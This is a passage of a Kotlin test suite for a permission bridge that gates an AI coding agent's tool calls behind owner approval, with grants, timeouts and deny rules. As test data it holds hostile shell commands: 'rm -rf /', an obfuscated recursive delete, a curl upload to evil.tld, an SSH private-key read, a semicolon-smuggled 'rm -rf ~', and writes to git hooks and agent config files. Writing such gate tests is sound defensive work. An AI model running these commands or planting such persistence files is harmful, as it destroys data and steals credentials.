    fun remembered_rule_auto_allows_next_matching_request() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val rules = mutableSetOf<String>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        // first "git status" → ask, allow+remember adds the "git status" rule
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "git status") }))
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, remember = true))
        // second identical command → no new ask, auto-allowed (M2 also drops an audit chip in the stream)
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "git status -s") }))
        assertEquals(1, emitted.filterIsInstance<PermissionAsk>().size) // only the first asked
        assertTrue(responses.last().allow)
        scope.cancel()
    }

    // ── issue #91: a bridge's owner Bash allow-list auto-runs matching commands with NO phone ask ──

    @Test
    fun bridge_whitelisted_command_auto_allows_without_emitting_an_ask() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeAllowedCommands = listOf("npm test"))

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "npm test -- --ci") }))
        assertTrue(emitted.isEmpty(), "a whitelisted command must not raise a phone ask")
        val r = responses.single()
        assertTrue(r.allow)
        assertFalse(r.remember) // one-off allow, never a standing remembered rule
        scope.cancel()
    }

    @Test
    fun bridge_non_whitelisted_command_still_asks_the_owner() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeAllowedCommands = listOf("npm test"))

        // not on the list, and not a metachar/dangerous line → routes to the phone as before
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "python deploy.py") }))
        assertIs<PermissionAsk>(emitted.single())
        assertTrue(responses.isEmpty())
        scope.cancel()
    }

    @Test
    fun bridge_whitelist_never_overrides_a_dangerous_command() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeAllowedCommands = listOf("rm")) // even a reckless "rm" grant

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertTrue(emitted.isEmpty()) // hard-denied, not asked
        val r = responses.single()
        assertFalse(r.allow) // DANGEROUS wall stands over any whitelist
        scope.cancel()
    }

    // ── REVIEWED TRUST: REVIEWER_APPROVED shares AUTO_TRUSTED's closed machine-confined ceiling ──

    @Test
    fun reviewer_approved_grant_matches_the_auto_trusted_wall_matrix_exactly() = runBlocking {
        // ONE parameterized sweep over both legacy machine-confined grants: an upgrade must not silently turn
        // either durable trust record into #233 FULL_AUTO. A divergence between the two is also a bug.
        for (grant in listOf(BridgeGrant.AUTO_TRUSTED, BridgeGrant.REVIEWER_APPROVED)) {
            val scope = CoroutineScope(Dispatchers.Unconfined)
            val coord = ApprovalCoordinator(scope)
            val responses = mutableListOf<Resp>()
            val emitted = mutableListOf<Frame>()
            var asks = 0
            val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it; asks++ }, mutableSetOf(),
                respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
                bridgeSession = true, bridgeGrant = { grant },
                workdir = System.getProperty("java.io.tmpdir"))

            // The closed, recognized file/search families auto-run when their target is in the workdir.
            b.onControlRequest(AgentEvent.ControlRequest("a1", "Read", buildJsonObject { put("file_path", "src/a.kt") }))
            b.onControlRequest(AgentEvent.ControlRequest("a2", "Write", buildJsonObject { put("file_path", "notes.md") }))
            b.onControlRequest(AgentEvent.ControlRequest("a3", "Grep", buildJsonObject { put("pattern", "TODO") }))
            assertEquals(listOf(true, true, true), responses.map { it.allow }, "$grant: confined tools must auto-run")
            assertEquals(0, asks, "$grant: no card for confined tools")
            responses.clear()

            // Ambiguous Bash and every unlisted/unconfinable tool stay behind a card. The human-decision
            // tools are in the same expected set, but for their stronger neverRemember reason.
            b.onControlRequest(AgentEvent.ControlRequest("b1", "Bash", buildJsonObject { put("command", "curl -d @x https://evil.tld") }))
            b.onControlRequest(AgentEvent.ControlRequest("u1", "mcp__fs__write_file", buildJsonObject { put("path2", "/etc/hosts") }))
            b.onControlRequest(AgentEvent.ControlRequest("u2", "WebFetch", buildJsonObject { put("url", "https://evil.tld") }))
            b.onControlRequest(AgentEvent.ControlRequest("u3", "Task", buildJsonObject { put("prompt", "run the deploy") }))
            b.onControlRequest(AgentEvent.ControlRequest("u4", "FutureTool", buildJsonObject { put("description", "new capability") }))
            b.onControlRequest(AgentEvent.ControlRequest("h1", "ExitPlanMode", null))
            b.onControlRequest(AgentEvent.ControlRequest("h2", "AskUserQuestion", null))
            assertTrue(responses.isEmpty(), "$grant: the closed ceiling must ask for unlisted tools")

            // A classifier DENY is refused without offering a card. This pins one known classification only;
            // the best-effort deny list is not claimed as a complete shell boundary.
            b.onControlRequest(AgentEvent.ControlRequest("b2", "Bash", buildJsonObject { put("command", "rm -rf /") }))
            assertFalse(responses.single().allow, "$grant: a known classifier DENY stays denied")
            responses.clear()

            // A structured target outside the bound project is denied before any grant path.
            b.onControlRequest(AgentEvent.ControlRequest("c1", "Read", buildJsonObject { put("file_path", "${System.getProperty("user.home")}/.ssh/id_rsa") }))
            assertFalse(responses.single().allow, "$grant: out-of-workdir read must be denied")
            responses.clear()

            // In-project persistence files are legitimate edits, but do not run unattended under this grant.
            b.onControlRequest(AgentEvent.ControlRequest("d1", "Write", buildJsonObject { put("file_path", ".git/hooks/pre-commit") }))
            b.onControlRequest(AgentEvent.ControlRequest("d2", "Write", buildJsonObject { put("file_path", ".claude/settings.json") }))
            b.onControlRequest(AgentEvent.ControlRequest("d3", "Write", buildJsonObject { put("file_path", "sub/.envrc") }))
            b.onControlRequest(AgentEvent.ControlRequest("d4", "Write", buildJsonObject { put("file_path", ".mcp.json") }))
            b.onControlRequest(AgentEvent.ControlRequest("d5", "Write", buildJsonObject { put("file_path", "AGENTS.md") }))
            b.onControlRequest(AgentEvent.ControlRequest("d6", "Edit", buildJsonObject { put("file_path", "sub/CLAUDE.md") }))
            b.onControlRequest(AgentEvent.ControlRequest("d7", "MultiEdit", buildJsonObject { put("file_path", ".codex/config.toml") }))
            b.onControlRequest(AgentEvent.ControlRequest("d8", "Write", buildJsonObject { put("file_path", ".opencode/plugin.js") }))
            assertTrue(responses.isEmpty(), "$grant: auto-executing files must reach the owner")

            // A recognized named-file tool with no resolved target cannot claim machine confinement.
            b.onControlRequest(AgentEvent.ControlRequest("f1", "Edit", buildJsonObject { put("description", "tweak") }))
            assertTrue(responses.isEmpty(), "$grant: unresolved target must ask")

            assertEquals(
                setOf(
                    "b1", "u1", "u2", "u3", "u4", "h1", "h2",
                    "d1", "d2", "d3", "d4", "d5", "d6", "d7", "d8", "f1",
                ),
                emitted.filterIsInstance<PermissionAsk>().map { it.askId }.toSet(),
                "$grant: exact closed-ceiling ask set",
            )
            scope.cancel()
        }
    }

    @Test
    fun reviewer_full_auto_runs_broad_tools_but_keeps_pre_grant_and_human_decision_checks() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true,
            bridgeGrant = { BridgeGrant.REVIEWER_FULL_AUTO },
            workdir = System.getProperty("java.io.tmpdir"))

        val broad = listOf(
            AgentEvent.ControlRequest("safe-bash", "Bash", buildJsonObject { put("command", "pwd") }),
            AgentEvent.ControlRequest("ask-bash", "Bash", buildJsonObject { put("command", "python deploy.py") }),
            // The classifier's DENY patterns are explicitly best-effort. This obfuscated spelling lands in
            // ASK, and explicit FULL_AUTO accepts that broader shell risk. PermissionBridge only returns the
            // control decision in this test; no shell command is executed.
            AgentEvent.ControlRequest("obfuscated-bash", "Bash", buildJsonObject { put("command", "r\\m -rf ~/Documents") }),
            AgentEvent.ControlRequest("mcp", "mcp__fs__write_file", buildJsonObject { put("path2", "/etc/hosts") }),
            AgentEvent.ControlRequest("web", "WebFetch", buildJsonObject { put("url", "https://example.invalid") }),
            AgentEvent.ControlRequest("task", "Task", buildJsonObject { put("prompt", "run the deploy") }),
            AgentEvent.ControlRequest("unknown", "FutureTool", buildJsonObject { put("description", "new capability") }),
        )
        broad.forEach { b.onControlRequest(it) }
        assertEquals(broad.map { it.requestId }, responses.map { it.askId })
        assertTrue(responses.all { it.allow }, "explicit FULL_AUTO covers ordinary execution tools")
        assertTrue(emitted.isEmpty())
        responses.clear()

        b.onControlRequest(AgentEvent.ControlRequest("known-deny", "Bash", buildJsonObject { put("command", "rm -rf /") }))
        assertFalse(responses.single().allow, "a known deterministic DENY still precedes FULL_AUTO")
        responses.clear()

        b.onControlRequest(AgentEvent.ControlRequest(
            "outside", "Read",
            buildJsonObject { put("file_path", "${System.getProperty("user.home")}/.ssh/id_rsa") },
        ))
        assertFalse(responses.single().allow, "a known structured path outside the workdir stays denied")
        responses.clear()

        // FULL_AUTO is broad, but a recognized structured target that persists into the owner's later
        // execution still gets one explicit card. This hold is target-shaped; Bash/MCP/unknown tools above
        // intentionally do not claim the same confinement.
        b.onControlRequest(AgentEvent.ControlRequest(
            "persistence", "Write", buildJsonObject { put("file_path", ".git/hooks/pre-commit") },
        ))
        // A renamed/future tool still carries a structured path key. The hold is schema-shaped, not a stale
        // exact-name list, so it cannot silently write persistence just because the CLI renamed the tool.
        b.onControlRequest(AgentEvent.ControlRequest(
            "renamed-persistence", "WriteFileV2", buildJsonObject { put("file_path", ".git/hooks/pre-commit") },
        ))
        b.onControlRequest(AgentEvent.ControlRequest("plan", "ExitPlanMode", null))
        b.onControlRequest(AgentEvent.ControlRequest("question", "AskUserQuestion", null))
        assertTrue(responses.isEmpty(), "structured persistence and human-decision tools must ask")
        assertEquals(
            setOf("persistence", "renamed-persistence", "plan", "question"),
            emitted.filterIsInstance<PermissionAsk>().map { it.askId }.toSet(),
        )
        scope.cancel()
    }

    @Test
    fun reviewer_approved_is_not_owner_approved_a_revoked_grant_locks_again() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        var grant = BridgeGrant.REVIEWER_APPROVED
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true, bridgeGrant = { grant },
            workdir = System.getProperty("java.io.tmpdir"))
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Read", buildJsonObject { put("file_path", "a.kt") }))
        assertTrue(responses.single().allow)
        responses.clear()
        // turn ended → grant revoked → the SAME conversation is locked for the next request
        grant = BridgeGrant.NONE
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Read", buildJsonObject { put("file_path", "a.kt") }))
        assertTrue(responses.isEmpty(), "with the grant revoked the request must ask again")
        scope.cancel()
    }

    @Test
    fun an_atomic_grant_claim_blocks_auto_allow_after_cancellation() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        var grant = BridgeGrant.REVIEWER_FULL_AUTO
        val b = PermissionBridge(
            "c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true,
            bridgeGrant = { grant },
            // Models Conversation.requestInterrupt revoking under the same synchronization point before this
            // tool is allowed. PermissionBridge may have read the old grant above, but must claim again.
            useBridgeGrant = { expected, allow ->
                grant = BridgeGrant.NONE
                if (grant == expected) { allow(); true } else false
            },
            workdir = System.getProperty("java.io.tmpdir"),
        )

        b.onControlRequest(AgentEvent.ControlRequest("after-cancel", "Bash", buildJsonObject { put("command", "python deploy.py") }))

        assertTrue(responses.isEmpty(), "a stale full-auto read must not decide after the atomic claim fails")
        assertEquals("after-cancel", assertIs<PermissionAsk>(emitted.single()).askId)
        scope.cancel()
    }

    @Test
    fun owner_bypass_also_needs_a_live_turn_grant_after_cancellation() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        var grant = BridgeGrant.OWNER_BYPASS
        val b = PermissionBridge(
            "c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            bridgeSession = true,
            ownerBypassSession = true,
            bridgeGrant = { grant },
            useBridgeGrant = { expected, allow ->
                grant = BridgeGrant.NONE // requestInterrupt won the lifecycle race
                if (grant == expected) { allow(); true } else false
            },
            workdir = System.getProperty("java.io.tmpdir"),
        )

        b.onControlRequest(
            AgentEvent.ControlRequest("owner-after-cancel", "Bash", buildJsonObject { put("command", "python deploy.py") }),
        )

        assertTrue(responses.isEmpty(), "the dedicated owner session must not carry standing post-cancel authority")
        assertEquals("owner-after-cancel", assertIs<PermissionAsk>(emitted.single()).askId)
        scope.cancel()
    }

    // ── issue #100: timeout is no longer a silent 30s auto-deny ──────────────────────────────────

    @Test
    fun ask_carries_the_configured_timeout_window() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { _, _, _, _, _, _ -> }, verdictTimeoutMs = 45_000, questionTimeoutMs = 600_000)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))
        assertEquals(45, (emitted.single() as PermissionAsk).timeoutSec) // ms → sec: the phone counts against THIS
        scope.cancel()
    }

    @Test
    fun timeout_withdraws_the_card_and_denies_with_an_honest_message() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        // the timeout fires on a background delay thread — thread-safe collectors
        val emitted = CopyOnWriteArrayList<Frame>()
        val responses = CopyOnWriteArrayList<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            verdictTimeoutMs = 50)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))
        delay(500) // let the 50ms timeout fire

        // the phone is told the card died (the ONE path it can't observe on its own) — with a TIMED_OUT reason
        val withdrawn = emitted.filterIsInstance<AskWithdrawn>().single()
        assertEquals("r1", withdrawn.askId)
        assertEquals(AskWithdrawnReason.TIMED_OUT, withdrawn.reason)
        // the CLI gets a deny, but NOT a bare "denied"/"timed out": an honest, distinguishable message
        val r = responses.single()
        assertFalse(r.allow)
        assertTrue(r.deny!!.contains("NOT a denial"), r.deny!!)
        assertFalse(b.hasPending())
        scope.cancel()
    }

    // ── issue #201: "wait for my decision" — the ask renews instead of auto-denying ──────────────

    @Test
    fun no_auto_deny_marks_the_card_and_sends_the_renewal_window() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { _, _, _, _, _, _ -> }, verdictTimeoutMs = 45_000, noAutoDeny = { true })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))

        val ask = emitted.single() as PermissionAsk
        assertTrue(ask.noAutoDeny, "the client needs this to drop the countdown ring")
        // the configured window is IGNORED in this mode — the card carries the renewal lease instead
        assertEquals(86_400, ask.timeoutSec)
        scope.cancel()
    }

    @Test
    fun a_no_auto_deny_ask_survives_its_window_and_a_late_allow_still_runs() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        // tiny ceiling so a renewal happens in milliseconds instead of a day
        val coord = ApprovalCoordinator(scope, absoluteDeadlineMs = 80)
        val emitted = CopyOnWriteArrayList<Frame>()
        val responses = CopyOnWriteArrayList<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            verdictTimeoutMs = 50, noAutoDeny = { true }, noAutoDenyWindowMs = 60)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))
        delay(400) // several windows past the point a normal ask would have auto-denied

        assertTrue(emitted.none { it is AskWithdrawn }, "renewing must never retire the card")
        assertTrue(responses.isEmpty(), "and must never answer the CLI on the user's behalf")
        assertTrue(b.hasPending())
        // the user finally gets to their phone — the verdict still lands
        assertTrue(coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW)))
        assertTrue(responses.single().allow)
        scope.cancel()
    }

    @Test
    fun a_bridge_or_guest_construction_keeps_its_bounded_window() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        // Conversation passes `origin == null && pathScope == null && …` — a bridge/guest resolves to false.
        // The default here IS that false: an adapter that forgets to opt in never gets the mode.
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { _, _, _, _, _, _ -> }, verdictTimeoutMs = 120_000)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))

        val ask = emitted.single() as PermissionAsk
        assertFalse(ask.noAutoDeny, "a card whose approver isn't the session owner must still expire")
        assertEquals(120, ask.timeoutSec)
        scope.cancel()
    }

    @Test
    fun late_verdict_after_timeout_is_surfaced_not_silently_dropped() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = CopyOnWriteArrayList<Frame>()
        val responses = CopyOnWriteArrayList<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            verdictTimeoutMs = 50)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))
        delay(500) // ask times out first
        responses.clear() // ignore the timeout's own deny; focus on the LATE verdict
        // user tapped Allow a moment too late: the coordinator reports it unclaimed (false), which is
        // RequestRouter's cue to answer the tapping device with an ask_expired PocketError
        assertFalse(coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW)))

        // the orphaned allow must NOT reach the CLI (nothing auto-runs)
        assertTrue(responses.isEmpty(), responses.toString())
        scope.cancel()
    }

    @Test
    fun cancelAll_withdraws_every_open_card() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { _, _, _, _, _, _ -> })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", null))
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", null))
        emitted.clear() // drop the two PermissionAsk frames
        b.cancelAll() // e.g. session close / relaunch

        val withdrawn = emitted.filterIsInstance<AskWithdrawn>()
        assertEquals(setOf("r1", "r2"), withdrawn.map { it.askId }.toSet())
        assertTrue(withdrawn.all { it.reason == AskWithdrawnReason.WITHDRAWN })
        assertFalse(b.hasPending())
        scope.cancel()
    }

    // ── approval design M2: 允许本任务 / 换种安全方式 ────────────────────────────────────────────

    @Test
    fun allow_for_task_covers_matching_requests_with_a_chip_until_the_task_rotates() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val grants = dev.ccpocket.daemon.approval.ApprovalGrantStore()
        var task: String? = "t1"
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val wd = java.nio.file.Files.createTempDirectory("ccp-grant-wd").toFile().canonicalPath
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            grants = grants, taskId = { task }, workdir = wd)

        // first ask carries the task + offered scopes; the user answers 允许本任务
        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "git status") }))
        val ask = emitted.filterIsInstance<PermissionAsk>().single()
        assertEquals("t1", ask.taskId)
        assertEquals(listOf("once", "task", "session"), ask.grantOptions)
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, grantScope = "task"))
        assertTrue(responses.single().allow)
        assertFalse(responses.single().remember, "a task grant is daemon state, never a CLI remember")

        // a matching follow-up auto-runs with an in-stream audit chip instead of a card
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "git status") }))
        assertTrue(responses.last().allow)
        val chip = emitted.filterIsInstance<dev.ccpocket.protocol.AuthorizedActionRecorded>().single()
        assertEquals("task-grant", chip.basis)
        assertEquals("git status", chip.actionSummary) // the RULE, never the full command line
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isEmpty())

        // a metacharacter smuggle behind the granted prefix still reaches a human
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("r3", "Bash", buildJsonObject { put("command", "git status; rm -rf ~") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isNotEmpty(), "smuggled command must ask")

        // the next top-level prompt rotates the task — the grant is gone
        task = "t2"
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("r4", "Bash", buildJsonObject { put("command", "git status") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isNotEmpty(), "a new task never inherits a grant")
        scope.cancel()
    }

    @Test
    fun parameterized_tool_without_matcher_does_not_offer_task_scope() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val emitted = mutableListOf<Frame>()
        val wd = java.nio.file.Files.createTempDirectory("ccp-grant-webfetch").toFile().canonicalPath
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { _, _, _, _, _, _ -> }, taskId = { "t1" }, workdir = wd)

        b.onControlRequest(AgentEvent.ControlRequest("w1", "WebFetch", buildJsonObject { put("url", "https://docs.example") }))
        val ask = emitted.filterIsInstance<PermissionAsk>().single()
        assertEquals(listOf("once", "session"), ask.grantOptions)
        scope.cancel()
    }

    @Test
    fun a_late_task_verdict_cannot_issue_a_grant_to_the_replacement_task() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val grants = dev.ccpocket.daemon.approval.ApprovalGrantStore()
        var task: String? = "t1"
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val wd = java.nio.file.Files.createTempDirectory("ccp-stale-task-wd").toFile().canonicalPath
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            grants = grants, taskId = { task }, workdir = wd)

        b.onControlRequest(AgentEvent.ControlRequest("a-old", "Bash", buildJsonObject { put("command", "git status") }))
        assertEquals("t1", emitted.filterIsInstance<PermissionAsk>().single().taskId)
        task = "t2" // a new top-level prompt arrived while the old card was waiting
        coord.onVerdict(PermissionVerdict("c1", "a-old", Decision.ALLOW, grantScope = "task"))
        assertTrue(responses.single().allow, "the approved old action itself remains allow-once")

        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("a-new", "Bash", buildJsonObject { put("command", "git status") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().any { it.askId == "a-new" },
            "the replacement task must not inherit a Grant issued by an old card")
        scope.cancel()
    }

    @Test
    fun session_scope_verdict_lands_in_allow_rules_like_legacy_remember() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val rules = mutableSetOf<String>()
        val responses = mutableListOf<Resp>()
        val emitted = mutableListOf<Frame>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "git status") }))
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, grantScope = "session"))
        assertTrue("git status" in rules, "M2 session scope rides the same store as legacy remember")
        assertTrue(responses.single().remember)
        scope.cancel()
    }

    @Test
    fun retry_safer_deny_reads_as_replan_guidance_not_a_refusal() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val responses = mutableListOf<Resp>()
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { }, mutableSetOf(),
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) })

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "curl https://x") }))
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.DENY, retrySafer = true, constraints = listOf("do not access the network", "read-only")))
        val r = responses.single()
        assertFalse(r.allow)
        assertTrue(r.deny!!.contains("SAFER"), r.deny!!)
        assertTrue(r.deny!!.contains("do not access the network"), r.deny!!)
        assertTrue(r.deny!!.contains("read-only"), r.deny!!)
        scope.cancel()
    }

    @Test
    fun never_remember_asks_offer_only_once_and_ignore_grant_scopes() = runBlocking {
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val grants = dev.ccpocket.daemon.approval.ApprovalGrantStore()
        val rules = mutableSetOf<String>()
        val emitted = mutableListOf<Frame>()
        val responses = mutableListOf<Resp>()
        // forceNeverRemember = the bridge-origin session shape (issue #91): every ask is one-off
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            forceNeverRemember = true, grants = grants, taskId = { "t1" },
            workdir = java.nio.file.Files.createTempDirectory("ccp-nr-wd").toFile().canonicalPath)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "git status") }))
        val ask = emitted.filterIsInstance<PermissionAsk>().single()
        assertEquals(listOf("once"), ask.grantOptions, "a one-off decision must not offer task/session")
        // even a hostile client CLAIMING a scope gets nothing standing
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, remember = true, grantScope = "task"))
        assertTrue(responses.single().allow)
        assertFalse(responses.single().remember)
        assertTrue(rules.isEmpty(), "no session rule may form on a never-remember ask")
        emitted.clear()
        b.onControlRequest(AgentEvent.ControlRequest("r2", "Bash", buildJsonObject { put("command", "git status") }))
        assertTrue(emitted.filterIsInstance<PermissionAsk>().isNotEmpty(), "no task grant may form either")
        scope.cancel()
    }

    // ── §18.1 P1 attack paths ────────────────────────────────────────────────────────────────────

    @Test
    fun handoff_bash_offers_only_once_and_a_hostile_scope_claim_forms_nothing() = runBlocking {
        // P1-2: the ceiling is DAEMON state — a modified client claiming task/session gets nothing standing
        val scope = CoroutineScope(Dispatchers.Unconfined)
        val coord = ApprovalCoordinator(scope)
        val grants = dev.ccpocket.daemon.approval.ApprovalGrantStore()
        val rules = mutableSetOf<String>()
        val emitted = mutableListOf<Frame>()
        val responses = mutableListOf<Resp>()
        val wd = java.nio.file.Files.createTempDirectory("ccp-ho-wd").toFile().canonicalPath
        val b = PermissionBridge("c1", PermissionMode.DEFAULT, coord, { emitted += it }, rules,
            respond = { id, allow, remember, _, upd, deny -> responses += Resp(id, allow, remember, upd, deny) },
            handoffAccess = dev.ccpocket.protocol.HandoffAccess.REVIEW_READ_ONLY,
            grants = grants, taskId = { "t1" }, workdir = wd)

        b.onControlRequest(AgentEvent.ControlRequest("r1", "Bash", buildJsonObject { put("command", "git status") }))
        val ask = emitted.filterIsInstance<PermissionAsk>().single()
        assertEquals(listOf("once"), ask.grantOptions, "a handoff shell decision is one-command-at-a-time")
        coord.onVerdict(PermissionVerdict("c1", "r1", Decision.ALLOW, remember = true, grantScope = "task"))
        assertTrue(responses.single().allow)
        assertFalse(responses.single().remember)
